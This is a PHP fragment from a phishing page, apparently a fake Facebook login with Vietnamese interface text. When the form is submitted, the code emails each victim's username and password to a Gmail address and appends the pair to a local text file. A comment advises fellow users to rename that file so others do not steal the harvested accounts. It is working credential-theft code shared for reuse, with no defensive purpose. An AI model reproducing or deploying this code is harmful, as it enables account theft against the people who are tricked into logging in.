    ...
    <?php
    	if(isset($_POST["login"])){
            ...
            echo $_SESSION["username"];
    		 $subject = "YTB TRUNG HOÀNG FF ";
             $headers = "Tài khoản - Facebook";
             $body = "$username| $password \n";
             mail("ngheoaihay1283@gmail.com", $headers, $body, $subject); 
            $test = fopen("accneseptrung.txt","a"); //tệp nhận file ae đổi tránh bị ăn cắp thông tin nhé
            fwrite($test,$body);
            fclose($test); 
...
<center class='mt-2'><b><font color="#FF0000<?php echo $mau_chu;?>">Vui Lòng Đăng Nhập Để Tiếp Tục  </b></center>
<div class='container'>
